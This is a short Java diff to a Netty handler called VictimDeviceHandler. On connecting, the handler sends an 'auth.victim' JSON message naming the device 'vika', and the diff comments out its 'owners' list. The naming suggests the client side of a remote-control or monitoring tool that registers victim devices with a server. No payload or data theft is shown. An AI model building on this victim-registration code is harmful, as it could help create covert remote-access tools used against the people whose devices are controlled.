@@ -16,12 +16,12 @@ public class VictimDeviceHandler extends ChannelInboundHandlerAdapter {
         SocketAddress address = ctx.channel().remoteAddress();
         System.out.println("Успешно подключились! ("+address+")");
         this.ctx = ctx;
-        ArrayList<String> owners = new ArrayList<>();
-        owners.add("vetal");
+        //ArrayList<String> owners = new ArrayList<>();
+        //owners.add("vetal");
         JSONObject jsonObject = new JSONObject();
         jsonObject.put("action", "auth.victim");
         jsonObject.put("name", "vika");
-        jsonObject.put("owners", owners);
+        //jsonObject.put("owners", owners);
         sendMessage(jsonObject);
     }
 
